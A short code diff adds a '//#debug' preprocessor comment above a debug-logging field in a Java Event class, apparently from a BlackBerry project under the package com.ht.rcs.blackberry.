@@ -21,6 +21,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 public abstract class Event extends StartStopThread {
 
     /** The debug instance. */
+	//#debug
     private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
 
     /** The Constant EVENT. */
